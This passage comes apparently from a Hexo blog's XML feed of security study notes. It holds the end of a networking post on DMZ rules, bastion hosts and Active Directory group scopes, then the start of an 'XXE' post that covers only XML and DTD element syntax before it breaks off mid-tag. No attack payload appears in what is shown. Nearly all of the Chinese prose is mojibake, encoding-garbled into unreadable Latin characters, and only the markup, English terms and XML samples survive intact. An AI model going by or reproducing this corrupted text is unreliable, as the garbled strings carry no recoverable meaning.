ç§°ä¸ºéš”ç¦»åŒºä¹Ÿç§°ä¸ºéå†›äº‹åŒ–åŒºï¼Œæ˜¯ä¸ºäº†è§£å†³å®‰è£…é˜²ç«å¢™åå¤–éƒ¨ç½‘ç»œä¸èƒ½è®¿é—®å†…éƒ¨ç½‘ç»œæœåŠ¡å™¨çš„é—®é¢˜è€Œè®¾ç«‹çš„ä¸€ä¸ªéå®‰å…¨ç³»ç»Ÿä¸å®‰å…¨ç³»ç»Ÿä¹‹é—´çš„ç¼“å†²åŒºï¼Œæ”¾ç½®ä¸€äº›å¿…é¡»å…¬å¼€çš„æœåŠ¡å™¨è®¾æ–½ï¼Œä¾‹å¦‚ä¼ä¸š web æœåŠ¡å™¨ã€ftp æœåŠ¡å™¨å’Œè®ºå›æœåŠ¡å™¨ç­‰ï¼Œå› æ­¤å¯ä»¥ä»å¤–éƒ¨è®¿é—® DMZ</p><p>DMZ çš„å±éšœåŠŸèƒ½ï¼š</p><ol><li>å†…ç½‘å¯ä»¥è®¿é—®å¤–ç½‘ï¼Œéœ€è¦é˜²ç«å¢™æ‰§è¡Œ NAT</li><li>å†…ç½‘å¯ä»¥è®¿é—® DMZï¼Œç®¡ç† DMZ çš„æœåŠ¡å™¨</li><li>å¤–ç½‘ä¸èƒ½è®¿é—® DMZï¼Œå¤–ç½‘è®¿é—®å†…ç½‘å°±è¦é€šè¿‡ VPN æ¥è®¿é—®</li><li>å¤–ç½‘å¯ä»¥è®¿é—® DMZï¼Œå¤–ç½‘å¿…é¡»å¯ä»¥è®¿é—® DMZï¼Œå¹¶ä¸”ç”±é˜²ç«å¢™å®ç°å¯¹å¤–åœ°å€åˆ°æœåŠ¡å™¨åœ°å€çš„è½¬æ¢</li><li>DMZ ä¸èƒ½è®¿é—®å†…ç½‘ï¼Œå¦‚æœä¸æ‰§è¡Œæ­¤ç­–ç•¥æ—¶ï¼Œæ”»é™· DMZï¼Œå†…ç½‘å°†ä¸èƒ½å—åˆ°ä¿æŠ¤</li><li>DMZ ä¸èƒ½è®¿é—®å¤–ç½‘ï¼Œä¾‹å¤–ï¼šå½“ DMZ æœ‰é‚®ä»¶æœåŠ¡å™¨æ—¶ï¼Œå°±è¦å…è®¸è®¿é—®å¤–ç½‘</li></ol><p>å†…ç½‘åˆåˆ†ä¸ºåŠå…¬åŒºå’Œæ ¸å¿ƒåŒºï¼š</p><ol><li>å…¬å¸å‘˜å·¥å·¥ä½œåŒºï¼Œä¼šå®‰è£…é˜²ç—…æ¯’è½¯ä»¶ã€ä¸»æœºå…¥ä¾µæ£€æµ‹äº§å“ï¼Œå¦‚æœéƒ¨åˆ†åŠå…¬åŒºå¯ä»¥è®¿é—®æ ¸å¿ƒæ•°æ®åŒº(è¿ç»´äººå‘˜)ï¼Œåˆ™ä¼šéƒ¨ç½²å ¡å’æœº</li></ol><blockquote><p>å ¡å’æœºï¼Œä¹Ÿå«åšè¿ç»´å®‰å…¨å®¡è®¡ç³»ç»Ÿï¼Œå®ƒçš„æ ¸å¿ƒåŠŸèƒ½æ˜¯ 4Aï¼š</p><ol><li>èº«ä»½éªŒè¯ Authentication</li><li>è´¦å·ç®¡ç† Account</li><li>æˆæƒæ§åˆ¶ Authorization</li><li>å®‰å…¨å®¡è®¡ Audit</li></ol><p>å ¡å’æœºæ˜¯ç”¨æ¥æ§åˆ¶å“ªäº›äººå¯ä»¥ç™»å½•å“ªäº›èµ„äº§ï¼ˆäº‹å…ˆé˜²èŒƒå’Œäº‹ä¸­æ§åˆ¶ï¼‰ï¼Œä»¥åŠå½•åƒè®°å½•ç™»å½•èµ„äº§ååšäº†ä»€ä¹ˆäº‹æƒ…ï¼ˆäº‹åæº¯æºï¼‰</p></blockquote><ol start="2"><li>æ ¸å¿ƒåŒºï¼Œå­˜å‚¨æœ€é‡è¦çš„æ•°æ®ã€æ–‡æ¡£ï¼Œæœ‰æ—¥å¿—è®°å½•ã€å®‰å…¨å®¡è®¡ç­‰å®‰å…¨æªæ–½è¿›è¡Œä¸¥æ ¼ä¿æŠ¤ï¼Œå¾€å¾€åªæœ‰å°‘æ•°å†…ç½‘ä¸»æœºå¯ä»¥è®¿é—®</li></ol><ul><li><strong>åŸŸä¸­è®¡ç®—æœºçš„åˆ†ç±»</strong></li></ul><p>åŸŸæ§åˆ¶å™¨ã€æˆå‘˜æœåŠ¡å™¨ã€å®¢æˆ·æœºã€ç‹¬ç«‹æœåŠ¡å™¨</p><p>åŸŸæ§åˆ¶å™¨æ˜¯å¿…é¡»è¦æœ‰çš„ï¼Œå…¶ä»–ä¸‰ç§å¯ä»¥æ²¡æœ‰</p><ul><li><strong>åŸŸå†…æƒé™</strong></li></ul><p><strong>ç»„(group)</strong> æ˜¯ç”¨æˆ·è´¦å·çš„é›†åˆã€‚é€šè¿‡å‘ä¸€ç»„ç”¨æˆ·åˆ†é…æƒé™ï¼Œå°±ä¸ç”¨å‘æ¯ä¸ªç”¨æˆ·åˆ†é…æƒé™</p><ol><li><strong>åŸŸæœ¬åœ°ç»„</strong></li></ol><p>å¤šåŸŸç”¨æˆ·è®¿é—®å•åŸŸèµ„æº(è®¿é—®åŒä¸€ä¸ªåŸŸ)ï¼Œå¯ä»¥ä»ä»»ä½•åŸŸæ·»åŠ ç”¨æˆ·è´¦å·ã€é€šç”¨ç»„å’Œå…¨å±€ç»„ï¼Œä½†åªèƒ½åœ¨å…¶æ‰€åœ¨åŸŸå†…æŒ‡æ´¾æƒé™ã€‚åŸŸæœ¬åœ°ç»„ä¸èƒ½åµŒå¥—åœ¨å…¶ä»–ç»„ä¸­ã€‚åŸŸæœ¬åœ°ç»„ä¸»è¦ç”¨äºæˆäºˆæœ¬åŸŸå†…èµ„æºçš„è®¿é—®æƒé™</p><ol start="2"><li><strong>å…¨å±€ç»„</strong></li></ol><p>å•åŸŸç”¨æˆ·è®¿é—®å¤šåŸŸèµ„æº(å¿…é¡»æ˜¯åŒä¸€ä¸ªåŸŸä¸­çš„ç”¨æˆ·)ï¼Œåªèƒ½åœ¨åˆ›å»ºè¯¥å…¨å±€ç»„çš„åŸŸä¸­æ·»åŠ ç”¨æˆ·å’Œå…¨å±€ç»„çš„åŸŸä¸­æ·»åŠ ç”¨æˆ·å’Œå…¨å±€ç»„ã€‚å¯ä»¥åœ¨åŸŸæ£®æ—çš„ä»»ä½•åŸŸå†…æŒ‡æ´¾æƒé™ã€‚å…¨å±€ç»„å¯ä»¥åµŒå¥—åœ¨å…¶ä»–ç»„ä¸­ã€‚</p><ol start="3"><li><strong>é€šç”¨ç»„</strong></li></ol><p>é€šç”¨ç»„çš„æˆå‘˜æ¥è‡ªåŸŸæ£®æ—ä¸­ä»»ä½•åŸŸçš„ç”¨æˆ·è´¦å·ã€å…¨å±€ç»„å’Œå…¶ä»–é€šç”¨ç»„ï¼Œå¯ä»¥åœ¨è¯¥åŸŸæ£®æ—çš„ä»»ä½•åŸŸä¸­æŒ‡æ´¾æƒé™ï¼Œå¯ä»¥åµŒå¥—åœ¨å…¶ä»–ç»„ä¸­ï¼Œéå¸¸é€‚åˆåœ¨åŸŸæ£®æ—å†…çš„è·¨åŸŸè®¿é—®ä¸­ä½¿ç”¨ã€‚é€šç”¨ç»„çš„æˆå‘˜ä¸æ˜¯ä¿å­˜åœ¨å„è‡ªçš„åŸŸæ§åˆ¶å™¨ä¸­çš„ï¼Œè€Œæ˜¯ä¿å­˜åœ¨å…¨å±€ç¼–å½•(GC)ä¸­çš„ï¼Œä»»ä½•å˜åŒ–éƒ½ä¼šå¯¼è‡´å…¨æ—å¤åˆ¶</p><p><strong>åŸŸæœ¬åœ°ç»„æ¥è‡ªå…¨æ—ï¼Œä½œç”¨äºæœ¬åŸŸï¼›å…¨å±€ç»„æ¥è‡ªæœ¬åŸŸï¼Œä½œç”¨äºå…¨æ—ï¼›é€šç”¨ç»„æ¥è‡ªå…¨æ—ï¼Œä½œç”¨äºå…¨æ—</strong></p><ol start="4"><li><strong>A-G-DL-P ç­–ç•¥</strong></li></ol><p>A-G-DL-P ç­–ç•¥æ˜¯æŒ‡å°†ç”¨æˆ·è´¦å·æ·»åŠ åˆ°å…¨å±€ç»„ä¸­ï¼Œç„¶åä¸ºåŸŸæœ¬åœ°ç»„åˆ†é…èµ„æºæƒé™</p><ul><li><p>A(account)ï¼Œè¡¨ç¤ºç”¨æˆ·è´¦å·</p></li><li><p>G(Global Group)ï¼Œè¡¨ç¤ºå…¨å±€ç»„</p></li><li><p>U(Universal Group)ï¼Œè¡¨ç¤ºé€šç”¨ç»„</p></li><li><p>DL(Domain Local Group)ï¼Œè¡¨ç¤ºåŸŸæœ¬åœ°ç»„</p></li><li><p>P(Permissionï¼Œè®¸å¯)ï¼Œè¡¨ç¤ºèµ„æºæƒé™ã€‚</p></li></ul><p>åœ¨å®‰è£…åŸŸæ§åˆ¶å™¨æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨ç”Ÿæˆä¸€äº›ç»„ï¼Œç§°ä¸ºå†…ç½®ç»„ã€‚å†…ç½®ç»„å®šä¹‰äº†ä¸€äº›å¸¸ç”¨çš„æƒé™ã€‚ æŠŠæˆå‘˜æ·»åŠ è¿›å†…ç½®ç»„ï¼Œæˆå‘˜å°±ä¼šå–å¾—å†…ç½®ç»„çš„æƒé™ã€‚</p><ul><li><p>åŸŸæœ¬åœ°ç»„æƒé™</p><p>Administrators(ç®¡ç†å‘˜ç»„)</p><p>Remote Desktop Users(è¿œç¨‹ç™»å½•ç»„)</p><p>Print Operators(æ‰“å°æœºæ“ä½œå‘˜ç»„)</p><p>Account Operators(å¸å·æ“ä½œå‘˜ç»„)</p><p>Server Operaters(æœåŠ¡å™¨æ“ä½œå‘˜ç»„)</p><p>Backup Operators(å¤‡ä»½æ“ä½œå‘˜ç»„)</p></li><li><p>å…¨å±€ç»„ã€é€šç”¨ç»„çš„æƒé™</p><p>Domain Admins(åŸŸç®¡ç†å‘˜ç»„)</p><p>Enterprise Admins(ä¼ä¸šç³»ç»Ÿç®¡ç†å‘˜ç»„)</p><p>Schema Admins(æ¶æ„ç®¡ç†å‘˜ç»„)</p><p>Domain Users(åŸŸç”¨æˆ·ç»„)</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE</title>
    <link href="/2021/12/04/XXE/"/>
    <url>/2021/12/04/XXE/</url>
    
    <content type="html"><![CDATA[<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><p>XML æŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆe<strong>X</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguageï¼‰ï¼Œ è¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ã€‚åŒºåˆ«äºç”¨æ¥æ˜¾ç¤ºæ•°æ®çš„ html</p><p>ä½œç”¨ï¼š å½“ä½œå°å‹çš„æ•°æ®åº“ä½¿ç”¨ï¼Œå¦‚ msg èŠå¤©å·¥ä½œé€šè¿‡ xml æ–‡ä»¶åœ¨æœ¬åœ°ä¿ç•™èŠå¤©è®°å½•ï¼Œè½¯ä»¶çš„é…ç½®æ–‡ä»¶ xmkï¼Œé€šè®¯è½¯ä»¶é€šè¿‡ xml æ–‡ä»¶ä¿ç•™ç”¨æˆ·ä¹‹å‰çœ‹åˆ°çš„åª’ä½“ä¿¡æ¯ï¼Œåœ¨ç½‘ç«™å½“ä¸­å½“ä½œ â€œæ¥å£â€ æœåŠ¡ï¼ŒXML æ–‡ä»¶ä½œä¸ºé…ç½®æ–‡ä»¶ï¼ˆSpringã€Struts2 ç­‰ï¼‰ã€æ–‡æ¡£ç»“æ„è¯´æ˜æ–‡ä»¶ï¼ˆPDFã€RSS ç­‰ï¼‰ã€å›¾ç‰‡æ ¼å¼æ–‡ ä»¶ï¼ˆSVG headerï¼‰åº”ç”¨æ¯”è¾ƒå¹¿æ³›ã€‚</p><p>å®ä¾‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Math<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>me<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>vendor<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>pass the exam!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€è¡Œæ˜¯ XML å£°æ˜(å¯é€‰)ï¼Œå®šä¹‰äº† XML çš„ç‰ˆæœ¬ä»¥åŠä½¿ç”¨çš„ç¼–ç ï¼Œnote æ˜¯æ–‡æ¡£çš„æ ¹å…ƒç´ <code>&lt;note&gt;</code>(è¯´æ˜æœ¬æ–‡æ¡£æ˜¯ä¸€ä¸ªä¾¿ç¬º)</p><p>å­å…ƒç´ ï¼š<code>&lt;to&gt; &lt;from&gt; &lt;heading&gt; &lt;body&gt;</code></p><blockquote><p>æ³¨æ„ï¼šXML æ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿï¼Œå±æ€§å€¼é¡»åŠ å¼•å·</p></blockquote><p>å•ç‹¬çš„ XML æ–‡æ¡£ä¸ä¼šè¢«æµè§ˆå™¨è§£æï¼Œç›´æ¥è¢«å½“ä½œæ–‡æœ¬è¾“å‡º</p><p>å¯ä»¥é…åˆ CSS æ ¼å¼åŒ– XML è¾“å‡º</p><blockquote><p>&lt;?xml-stylesheet type=â€text/cssâ€ href=â€cd_catalog.cssâ€?&gt;</p></blockquote><p>ä½†æ›´å¸¸ç”¨çš„æ˜¯ä½¿ç”¨ XSLT è½¬æ¢ XML æ–‡æ¡£ç”¨ä»¥ HTML æ ¼å¼æ˜¾ç¤º</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211205150958245.png"></p><h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><h2 id="DTD-åŸºæœ¬æ¦‚å¿µ"><a href="#DTD-åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="DTD åŸºæœ¬æ¦‚å¿µ"></a>DTD åŸºæœ¬æ¦‚å¿µ</h2><p>XML æ–‡æ¡£æœ‰è‡ªå·±çš„ä¸€ä¸ªæ ¼å¼è§„èŒƒï¼Œè¿™ä¸ªæ ¼å¼è§„èŒƒæ˜¯ç”±ä¸€ä¸ªå«åš DTDï¼ˆdocument type definitionï¼‰ çš„ä¸œè¥¿æ§åˆ¶çš„ã€‚<br>DTD ç”¨æ¥ä¸º XML æ–‡æ¡£å®šä¹‰è¯­ä¹‰çº¦æŸã€‚å¯ä»¥åµŒå…¥åœ¨ XML æ–‡æ¡£ä¸­(å†…éƒ¨å£°æ˜)ï¼Œä¹Ÿå¯ä»¥ç‹¬ç«‹çš„æ”¾åœ¨å¦å¤–ä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ä¸­(å¤–éƒ¨å¼•ç”¨)ã€‚æ˜¯ XML æ–‡æ¡£ä¸­çš„å‡ æ¡è¯­å¥ï¼Œç”¨æ¥è¯´æ˜å“ªäº›å…ƒç´ /å±æ€§æ˜¯åˆæ³•çš„ä»¥åŠå…ƒç´ é—´åº”å½“æ€æ ·åµŒå¥—/ç»“åˆï¼Œä¹Ÿç”¨æ¥å°†ä¸€äº›ç‰¹æ®Šå­—ç¬¦å’Œå¯å¤ç”¨ä»£ç æ®µè‡ªå®šä¹‰ä¸ºå®ä½“ã€‚</p><h2 id="å…ƒç´ å£°æ˜"><a href="#å…ƒç´ å£°æ˜" class="headerlink" title="å…ƒç´ å£°æ˜"></a>å…ƒç´ å£°æ˜</h2><h3 id="å£°æ˜ä¸€ä¸ªå…ƒç´ "><a href="#å£°æ˜ä¸€ä¸ªå…ƒç´ " class="headerlink" title="å£°æ˜ä¸€ä¸ªå…ƒç´ "></a>å£°æ˜ä¸€ä¸ªå…ƒç´ </h3><p>åœ¨ DTD ä¸­ï¼ŒXML å…ƒç´ é€šè¿‡å…ƒç´ å£°æ˜æ¥è¿›è¡Œå£°æ˜ã€‚å…ƒç´ å£°æ˜ä½¿ç”¨ä¸‹é¢çš„è¯­æ³•ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> <span class="hljs-meta-keyword">category</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">element-content</span>)&gt;</span><br></code></pre></td></tr></table></figure><h3 id="ç©ºå…ƒç´ "><a href="#ç©ºå…ƒç´ " class="headerlink" title="ç©ºå…ƒç´ "></a>ç©ºå…ƒç´ </h3><p>ç©ºå…ƒç´ é€šè¿‡ç±»åˆ«å…³é”®è¯ EMPTY è¿›è¡Œå£°æ˜ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> <span class="hljs-meta-keyword">EMPTY</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å®ä¾‹:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">br</span> <span class="hljs-meta-keyword">EMPTY</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br></code></pre></td></tr></table></figure><h3 id="åªæœ‰-PCDATA-çš„å…ƒç´ "><a href="#åªæœ‰-PCDATA-çš„å…ƒç´ " class="headerlink" title="åªæœ‰ PCDATA çš„å…ƒç´ "></a>åªæœ‰ PCDATA çš„å…ƒç´ </h3><p>åªæœ‰ PCDATA çš„å…ƒç´ é€šè¿‡åœ†æ‹¬å·ä¸­çš„ #PCDATA è¿›è¡Œå£°æ˜ï¼š</p><p>å®ä¾‹:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br></code></pre></td></tr></table></figure><h3 id="å¸¦æœ‰ä»»ä½•å†…å®¹çš„å…ƒç´ "><a href="#å¸¦æœ‰ä»»ä½•å†…å®¹çš„å…ƒç´ " class="headerlink" title="å¸¦æœ‰ä»»ä½•å†…å®¹çš„å…ƒç´ "></a>å¸¦æœ‰ä»»ä½•å†…å®¹çš„å…ƒç´ </h3><p>é€šè¿‡ç±»åˆ«å…³é”®è¯ ANY å£°æ˜çš„å…ƒç´ ï¼Œå¯åŒ…å«ä»»ä½•å¯è§£ææ•°æ®çš„ç»„åˆï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> <span class="hljs-meta-keyword">ANY</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å®ä¾‹:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> <span class="hljs-meta-keyword">ANY</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="å¸¦æœ‰å­å…ƒç´ ï¼ˆåºåˆ—ï¼‰çš„å…ƒç´ "><a href="#å¸¦æœ‰å­å…ƒç´ ï¼ˆåºåˆ—ï¼‰çš„å…ƒç´ " class="headerlink" title="å¸¦æœ‰å­å…ƒç´ ï¼ˆåºåˆ—ï¼‰çš„å…ƒç´ "></a>å¸¦æœ‰å­å…ƒç´ ï¼ˆåºåˆ—ï¼‰çš„å…ƒç´ </h3><p>å¸¦æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªå­å…ƒç´ çš„å…ƒç´ é€šè¿‡åœ†æ‹¬å·ä¸­çš„å­å…ƒç´ åè¿›è¡Œå£°æ˜ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child1</span>)&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child1</span>,<span class="hljs-meta-keyword">child2</span>,...)&gt;</span><br></code></pre></td></tr></table></figure><p>å®ä¾‹:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">to</span>,<span class="hljs-meta-keyword">from</span>,<span class="hljs-meta-keyword">heading</span>,<span class="hljs-meta-keyword">body</span>)&gt;</span><br></code></pre></td></tr></table></figure><p>å½“å­å…ƒç´ æŒ‰ç…§ç”±é€—å·åˆ†éš”å¼€çš„åºåˆ—è¿›è¡Œå£°æ˜æ—¶ï¼Œè¿™äº›å­å…ƒç´ å¿…é¡»æŒ‰ç…§ç›¸åŒçš„é¡ºåºå‡ºç°åœ¨æ–‡æ¡£ä¸­ã€‚åœ¨ä¸€ä¸ªå®Œæ•´çš„å£°æ˜ä¸­ï¼Œå­å…ƒç´ ä¹Ÿå¿…é¡»è¢«å£°æ˜ï¼ŒåŒæ—¶å­å…ƒç´ ä¹Ÿå¯æ‹¥æœ‰å­å…ƒç´ ã€‚â€noteâ€ å…ƒç´ çš„å®Œæ•´å£°æ˜æ˜¯ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">to</span>,<span class="hljs-meta-keyword">from</span>,<span class="hljs-meta-keyword">heading</span>,<span class="hljs-meta-keyword">body</span>)&gt;</span><br> <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">to</span>      (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br> <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span>    (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br> <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">heading</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br> <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">body</span>    (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br></code></pre></td></tr></table></figure><h3 id="å£°æ˜åªå‡ºç°ä¸€æ¬¡çš„å…ƒç´ "><a href="#å£°æ˜åªå‡ºç°ä¸€æ¬¡çš„å…ƒç´ " class="headerlink" title="å£°æ˜åªå‡ºç°ä¸€æ¬¡çš„å…ƒç´ "></a>å£°æ˜åªå‡ºç°ä¸€æ¬¡çš„å…ƒç´ </h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child-name</span>)&gt;</span><br></code></pre></td></tr></table></figure><p>å®ä¾‹:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">message</span>)&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä¾‹å­å£°æ˜äº†ï¼šmessage å­å…ƒç´ å¿…é¡»å‡ºç°ä¸€æ¬¡ï¼Œå¹¶ä¸”å¿…é¡»åªåœ¨ â€œnoteâ€ å…ƒç´ ä¸­å‡ºç°ä¸€æ¬¡ã€‚</p><h3 id="å£°æ˜æœ€å°‘å‡ºç°ä¸€æ¬¡çš„å…ƒç´ "><a href="#å£°æ˜æœ€å°‘å‡ºç°ä¸€æ¬¡çš„å…ƒç´ " class="headerlink" title="å£°æ˜æœ€å°‘å‡ºç°ä¸€æ¬¡çš„å…ƒç´ "></a>å£°æ˜æœ€å°‘å‡ºç°ä¸€æ¬¡çš„å…ƒç´ </h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child-name</span>+)&gt;</span><br></code></pre></td></tr></table></figure><p>å®ä¾‹:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">message</span>+)&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä¾‹å­ä¸­çš„åŠ å·ï¼ˆ+ï¼‰å£°æ˜äº†ï¼šmessage å­å…ƒç´ å¿…é¡»åœ¨ â€œnoteâ€ å…ƒç´ å†…å‡ºç°è‡³å°‘ä¸€æ¬¡ã€‚</p><h3 id="å£°æ˜å‡ºç°é›¶æ¬¡æˆ–å¤šæ¬¡çš„å…ƒç´ "><a href="#å£°æ˜å‡ºç°é›¶æ¬¡æˆ–å¤šæ¬¡çš„å…ƒç´ " class="headerlink" title="å£°æ˜å‡ºç°é›¶æ¬¡æˆ–å¤šæ¬¡çš„å…ƒç´ "></a>å£°æ˜å‡ºç°é›¶æ¬¡æˆ–å¤šæ¬¡çš„å…ƒç´ </h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child-name</span>*)&gt;</span><br></code></pre></td></tr></table></figure><p>å®ä¾‹:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">message</span>*)&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä¾‹å­ä¸­çš„æ˜Ÿå·ï¼ˆ*ï¼‰å£°æ˜äº†ï¼šå­å…ƒç´  message å¯åœ¨ â€œnoteâ€ å…ƒç´ å†…å‡ºç°é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚</p><h3 id="å£°æ˜å‡ºç°é›¶æ¬¡æˆ–ä¸€æ¬¡çš„å…ƒç´ "><a href="#å£°æ˜å‡ºç°é›¶æ¬¡æˆ–ä¸€æ¬¡çš„å…ƒç´ " class="headerlink" title="å£°æ˜å‡ºç°é›¶æ¬¡æˆ–ä¸€æ¬¡çš„å…ƒç´ "></a>å£°æ˜å‡ºç°é›¶æ¬¡æˆ–ä¸€æ¬¡çš„å…ƒç´ </h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child-name</span>?)&gt;</span><br></code></pre></td></tr></table></figure><p>å®ä¾‹:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">message</span>?)&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä¾‹å­ä¸­çš„é—®å·(?)å£°æ˜äº†ï¼šå­å…ƒç´  message å¯åœ¨ â€œnoteâ€ å…ƒç´ å†…å‡ºç°é›¶æ¬¡æˆ–ä¸€æ¬¡ã€‚</p><h3 id="å£°æ˜â€éâ€¦-å³â€¦â€ç±»å‹çš„å†…å®¹"><a href="#å£°æ˜â€éâ€¦-å³â€¦â€ç±»å‹çš„å†…å®¹" class="headerlink" 